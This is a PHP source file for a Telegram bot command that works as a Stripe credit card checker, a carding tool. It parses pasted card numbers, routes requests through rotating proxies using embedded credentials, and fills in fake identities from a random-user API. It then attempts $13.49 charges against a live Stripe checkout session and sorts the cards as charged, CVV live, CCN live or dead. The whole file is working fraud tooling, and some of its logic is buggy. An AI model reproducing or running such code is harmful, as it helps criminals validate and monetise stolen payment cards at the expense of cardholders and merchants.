<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $c1 = substr($cc, 0, 4); 
            $c2 = substr($cc, 4, 4); 
            $c3 = substr($cc, 8, 4); 
            $c4 = substr($cc, -4);

            # <======[Sección de proxies]======>
            $Websharegay = rand(0,10);
            $rp1 = array(
              1 => 'hvidguaj-rotate:krw6oi4eer0c',
              2 => 'npwftlsc-rotate:xcedlbvc90r8',
              3 => 'vpgxzgbh-rotate:gb3efqhal8bi',
                ); 
            $rpt = array_rand($rp1);
                $rotate = $rp1[$rpt];
            $ip = array(
              1 => 'socks5://p.webshare.io:1080',
              2 => 'http://p.webshare.io:80',
                ); 
                $socks = array_rand($ip);
                $socks5 = $ip[$socks];
            $url = "https://api.ipify.org/";   
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_PROXY, $socks5);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
            $ip1 = curl_exec($ch);
            curl_close($ch);
            ob_flush();   
            if (isset($ip1)){
            $ip = "Proxy Live ✅";
            }
            if (empty($ip1)){
            $ip = "Proxy Dead ❌";
            }
# <====== [Fin de sección de proxies] ======>


            ###CHECKER PART###  
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            

                        ///////////////////////////////////////////////////////////////////////////////////////////////////////
            @unlink('cookie.txt');
            error_reporting(0);
            date_default_timezone_get('Asia/Jakarta');
            
            function GetStr($string, $start, $end){
            $str = explode($start, $string);
            $str = explode($end, $str[1]);
            return $str[0];
            }
            function multiexplode($seperator, $string){
            $one = str_replace($seperator, $seperator[0], $string);
            $two = explode($seperator[0], $one);
            return $two;
            }
            
            function Capture($str, $starting_word, $ending_word){
            $subtring_start  = strpos($str, $starting_word);
            $subtring_start += strlen($starting_word);   
            $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
            return substr($str, $subtring_start, $size);
            };
            
            
            if (number_format($mes) < 10){$mes = str_replace("0", "", $mes);};
            
            if (!file_exists(getcwd().'/Cookies')) mkdir(getcwd().'/Cookies', 0777, true);
            $dexy = getcwd().'/Cookies/shin'.uniqid('obu', true).'.txt';
            
            ////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$user = value($resposta, '"username":"', '"');
$pass = value($resposta, '"salt":"', '"');
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

            //////////////////////////////////////////////////////////////////////////////////////////////

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'authority: api.stripe.com',
              'method: POST',
              'path: /v1/payment_methods',
              'accept: application/json',
              'accept-encoding: gzip, deflate, br',
              'accept-language: en-US,en;q=0.9',
              'content-type: application/x-www-form-urlencoded',
              'origin: https://checkout.stripe.com',
              'referer: https://checkout.stripe.com/',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&key=pk_live_51JepzX2fuVSDit7ghCNcOUvePrs32GT0KzDL4UaBLZGmGViLZgQwo3sP3YjM01hN9kUHqelUXM8YEHUcjhh1JxDu00Ss2roa3M&payment_user_agent=stripe.js%2Faff2c6f2e4%3B+stripe-js-v3%2Faff2c6f2e4%3B+payment-link%3B+checkout");
            $result1 = curl_exec($ch);
            $pm = trim(strip_tags(getStr($result1,'"id":"','"')));
            /*if(stripos($result1, 'error')){
              $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
              $stripeerror = True;
            }else{
              $id = trim(strip_tags(capture($result1,'"id": "','"')));
              $stripeerror = False;
            }
            
            if(!$stripeerror){ */
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/cs_live_a15mScS1G9XVO3vzYsWUlVXZzNYv2rxdH2utFDdq3laVlL9omoWTCYaRQU/confirm ');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'authority: api.stripe.com',
                  'method: POST',
                  'path: /v1/payment_pages/cs_live_a15mScS1G9XVO3vzYsWUlVXZzNYv2rxdH2utFDdq3laVlL9omoWTCYaRQU/confirm',
                  'accept: application/json',
                  'accept-encoding: gzip, deflate, br',
                  'accept-language: en-US,en;q=0.9',
                  'content-type: application/x-www-form-urlencoded',
                  'origin: https://checkout.stripe.com',
                  'referer: https://checkout.stripe.com/',
                  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'));
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$pm.'&expected_amount=1349&shipping[address][line1]='.$street.'&shipping[address][city]='.$city.'&shipping[address][country]=US&shipping[address][postal_code]='.$zip.'&shipping[address][state]='.$state.'&shipping[name]='.$firstname.'+'.$lastname.'&expected_payment_method_type=card&key=pk_live_51JepzX2fuVSDit7ghCNcOUvePrs32GT0KzDL4UaBLZGmGViLZgQwo3sP3YjM01hN9kUHqelUXM8YEHUcjhh1JxDu00Ss2roa3M');
                
                $result2 = curl_exec($ch);
                $errormessage = trim(strip_tags(getStr($result2,'"code":"','"')));
            }
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);

            ###END OF CHECKER PART###
            
            
            if(substr_count($result2, '"seller_message": "Payment complete."')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card -»</b> <code>$lista</code>
<b>Status -»</b> Payment Success ✅
<b>Response -»</b> CHARGED!
<b>Gateway -»</b> Stripe $13.49
<b>IP -»</b> Proxy [$ip] 
<b>Time -»</b> <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
<b>➤ Checked by <a href='tg://user?id=$userId'>$firstname</a></b>
<b>➤ Developed with ♡ by <a href='t.me/todayisdisaster'>Brian 2.0</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}

              elseif(substr_count($result2, "Your card zip code is incorrect.")) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card -»</b> <code>$lista</code>
<b>Status -» CVV Live ✅
<b>Response -» Your card zip code is incorrect.
<b>Gateway -» Stripe $13.49
<b>IP -» Proxy [$ip] 
<b>Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
<b>➤ Checked by <a href='tg://user?id=$userId'>$firstname</a></b>
<b>➤ Developed with ♡ by <a href='t.me/todayisdisaster'>Brian 2.0</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

            elseif(substr_count($result2, "Your card's security code is incorrect.")) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card -»</b> <code>$lista</code>
<b>Status -» CCN Live ✅
<b>Response -» Your card's security code is incorrect.
<b>Gateway -» Stripe $13.49
<b>IP -» Proxy [$ip] 
<b>Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
<b>➤ Checked by <a href='tg://user?id=$userId'>$firstname</a></b>
<b>➤ Developed with ♡ by <a href='t.me/todayisdisaster'>Brian 2.0</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

                elseif(substr_count($result2, "Your card has insufficient funds.")) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card -»</b> <code>$lista</code>
<b>Status -» CVV Live ✅
<b>Response -» Your card has insufficient funds.
<b>Gateway -» Stripe $13.49
<b>IP -» Proxy [$ip] 
<b>Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
<b>➤ Checked by <a href='tg://user?id=$userId'>$firstname</a></b>
<b>➤ Developed with ♡ by <a href='t.me/todayisdisaster'>Brian 2.0</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

            else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card -»</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» $errormessage
Gateway -» Stripe $13.49
Time -» <b>$time</b><b>s</b>  
------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
<b>➤ Checked by <a href='tg://user?id=$userId'>$firstname</a></b>
<b>➤ Developed with ♡ by <a href='t.me/todayisdisaster'>Brian 2.0</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
          
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>
